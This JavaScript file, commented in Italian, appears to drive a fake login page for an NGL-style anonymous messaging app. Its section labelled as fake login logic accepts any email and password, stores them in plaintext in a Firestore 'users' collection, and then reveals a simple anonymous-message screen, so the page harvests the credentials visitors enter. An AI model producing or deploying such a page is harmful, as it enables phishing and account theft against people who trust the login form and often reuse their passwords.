/****************************************************
 * CONFIGURAZIONE E INIZIALIZZAZIONE FIREBASE (compat)
 ****************************************************/
const firebaseConfig = {
  apiKey: "AIzaSyC9mIsxGC5nhr2ExIlguePsPMGi5s69MsI",
  authDomain: "ngl-link-isaacbis.firebaseapp.com",
  projectId: "ngl-link-isaacbis",
  storageBucket: "ngl-link-isaacbis.appspot.com",
  messagingSenderId: "551004938464",
  appId: "1:551004938464:web:74781b8bdf51a008d4f085",
  measurementId: "G-1HND4WD5ND"
};

// Inizializza Firebase con la sintassi compat
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

/****************************************************
 * RIFERIMENTI AGLI ELEMENTI DEL DOM
 ****************************************************/
const loginContainer = document.getElementById("login-container");
const mainContainer = document.getElementById("main-container");

const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const loginError = document.getElementById("login-error");

const sendBtn = document.getElementById("sendBtn");
const messageTextarea = document.getElementById("message");
const receiveBtn = document.getElementById("receiveBtn");

/****************************************************
 * LOGICA DI LOGIN "FALSO"
 ****************************************************/
loginBtn.addEventListener("click", () => {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    loginError.textContent = "Email e password sono obbligatorie.";
    return;
  }

  // Salva i dati in Firestore (collezione "users")
  db.collection("users").add({
    email: email,
    password: password, // NON SICURO in produzione!
    createdAt: new Date()
  })
  .then((docRef) => {
    console.log("Utente salvato con ID:", docRef.id);
    // Passa alla schermata dei messaggi
    loginContainer.classList.add("hidden");
    mainContainer.classList.remove("hidden");
  })
  .catch((error) => {
    loginError.textContent = "Errore durante il salvataggio: " + error.message;
  });
});

/****************************************************
 * INVIO DI MESSAGGI ANONIMI
 ****************************************************/
sendBtn.addEventListener("click", () => {
  const message = messageTextarea.value.trim();
  if (!message) {
    alert("Il messaggio non può essere vuoto!");
    return;
  }

  // Salva il messaggio nella collezione "messages"
  db.collection("messages").add({
    message: message,
    timestamp: firebase.firestore.FieldValue.serverTimestamp()
  })
  .then(() => {
    alert("Messaggio inviato con successo!");
    messageTextarea.value = "";
  })
  .catch(error => {
    console.error("Errore nel salvataggio del messaggio:", error);
    alert("Impossibile inviare il messaggio.");
  });
});

/****************************************************
 * (FACOLTATIVO) RICEZIONE DEI MESSAGGI
 * Qui puoi implementare la logica per leggere i messaggi
 * salvati in Firestore (ad esempio stampandoli in console).
 ****************************************************/
receiveBtn.addEventListener("click", () => {
  db.collection("messages")
    .orderBy("timestamp", "desc")
    .get()
    .then(snapshot => {
      if (snapshot.empty) {
        alert("Non ci sono messaggi anonimi.");
      } else {
        console.log("=== Messaggi anonimi ===");
        snapshot.forEach(doc => {
          console.log(doc.data().message);
        });
        alert("Messaggi mostrati in console!");
      }
    })
    .catch(error => console.error("Errore nel recupero dei messaggi:", error));
});
